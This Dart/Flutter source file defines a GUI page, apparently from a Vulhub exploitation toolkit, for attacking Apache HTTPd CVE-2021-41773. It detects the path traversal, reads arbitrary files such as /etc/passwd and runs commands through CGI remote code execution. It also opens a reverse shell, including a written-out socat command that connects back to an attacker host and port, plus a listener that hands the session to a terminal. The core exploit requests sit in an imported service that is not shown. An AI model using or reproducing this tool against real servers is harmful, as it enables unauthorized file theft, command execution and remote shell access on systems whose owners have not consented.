import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../app/localization.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../services/reverse_shell_service.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';
import '../reverse_shell_terminal_page.dart';

class HttpdExpPage extends BaseVulhubExpPage {
  final String? initialTargetUrl;

  const HttpdExpPage({super.key, this.initialTargetUrl});

  @override
  State<HttpdExpPage> createState() => _HttpdPageState();
}

class _HttpdPageState extends BaseVulhubExpPageState<HttpdExpPage> {
  @override
  IconData get pageIcon => Icons.http;

  @override
  String get appBarTitle => S.vulhubHttpdTitle;

  @override
  String get cardTitle => S.vulhubHttpdCardTitle;

  @override
  String get cardSubtitle => S.vulhubHttpdCardSubtitle;

  late final TextEditingController _urlCtrl;
  final _cmdCtrl = TextEditingController(text: 'id');
  final _fileCtrl = TextEditingController(text: '/etc/passwd');
  final _lhostCtrl = TextEditingController();
  final _lportCtrl = TextEditingController(text: '4444');
  final _timeoutCtrl = TextEditingController();
  final ReverseShellService _rs = ReverseShellService();

  @override
  void initState() {
    super.initState();
    _urlCtrl = TextEditingController(text: widget.initialTargetUrl ?? '');
    _rs.loadConfig().then((_) {
      if (!mounted) return;
      _lhostCtrl.text = _rs.lhost;
      _lportCtrl.text = _rs.lport.toString();
    });
  }

  ApacheHttpdExpService _svc() => ApacheHttpdExpService(
    baseUrl: _urlCtrl.text.trim(),
    timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
  );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 CVE-2021-41773 路径穿越...');
    try {
      final r = await _svc().check();
      appendLog(
        r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : S.expLogNoVulnGeneric,
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _readFile() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final path = _fileCtrl.text.trim().isEmpty
        ? '/etc/passwd'
        : _fileCtrl.text.trim();
    setState(() => running = true);
    appendLog('[*] 读取文件: $path');
    try {
      final out = await _svc().readFile(path);
      appendLog(
        out != null && out.isNotEmpty ? '[+] 文件内容:\n$out' : '[-] 读取失败或文件不存在',
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _execRce() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => running = true);
    appendLog('[*] CGI RCE 执行: $cmd');
    try {
      final out = await _svc().execRce(cmd);
      appendLog(
        out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出（CGI 可能未启用）',
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _showReverseShellDialog() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final mode = await showReverseShellModeDialog(context);
    if (mode == null) return;

    final lhost = _lhostCtrl.text.trim();
    final lport = int.tryParse(_lportCtrl.text.trim()) ?? 4444;
    if (lhost.isEmpty || lport <= 0 || lport > 65535) {
      appendLog(S.expLogInvalidLhostLport);
      return;
    }

    _rs.lhost = lhost;
    _rs.lport = lport;
    _rs.saveConfig();

    if (!mounted) return;
    final nav = Navigator.of(context);
    _rs.onSession = (session) {
      session.label = 'HTTPd-CVE-2021-41773';
      if (!mounted) return;
      nav.push(
        MaterialPageRoute(
          builder: (_) => ReverseShellTerminalPage(session: session),
        ),
      );
    };

    setState(() => running = true);
    appendLog(S.expLogStartFullTerminalListen(lhost, lport, mode));
    try {
      await _rs.startListening(port: lport);

      if (mode == 'socat') {
        final cmd =
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport";
        appendLog(S.expLogSocatRunOnTarget);
        appendLog(cmd);
        if (mounted) {
          await showDialog<void>(
            context: context,
            builder: (_) => AlertDialog(
              title: Text(S.titleSocatCommand),
              content: SelectableText(cmd),
              actions: [
                TextButton(
                  onPressed: () => Navigator.of(context).pop(),
                  child: Text(S.btnClose),
                ),
              ],
            ),
          );
        }
      } else {
        final ok = await _svc().startReverseShell(
          lhost,
          lport,
          preferScript: mode == 'script',
        );
        appendLog(ok ? S.expLogReverseSentWaiting : S.expLogSendFailed);
      }
    } catch (e) {
      appendLog(S.expLogStartFailed(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _cmdCtrl.dispose();
    _fileCtrl.dispose();
    _lhostCtrl.dispose();
    _lportCtrl.dispose();
    _timeoutCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle(S.sectionTargetConfig),
          vTf(_urlCtrl, S.fieldTargetUrl, 'http://localhost:8080'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            S.fieldTimeout,
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 16),
          vSecTitle(S.sectionPathTraversal),
          vTf(_fileCtrl, S.fieldFilePath, '/etc/passwd'),
          const SizedBox(height: 8),
          Row(
            children: [
              vBtn(S.btnDetectVuln, running ? null : _check),
              const SizedBox(width: 8),
              vBtn(S.btnReadFile, running ? null : _readFile),
            ],
          ),
          const SizedBox(height: 16),
          vSecTitle(S.sectionCgiRce),
          vTf(_cmdCtrl, S.fieldCommand, 'id'),
          const SizedBox(height: 8),
          vBtn(S.btnExecCmd, running ? null : _execRce),
          const SizedBox(height: 16),
          vSecTitle(S.sectionGetShell),
          vTf(_lhostCtrl, S.fieldAttackerIp, '127.0.0.1'),
          const SizedBox(height: 8),
          vTf(
            _lportCtrl,
            S.fieldAttackerPort,
            '4444',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          vBtn(S.btnGetShell, running ? null : _showReverseShellDialog),
        ],
      ),
    );
  }
}
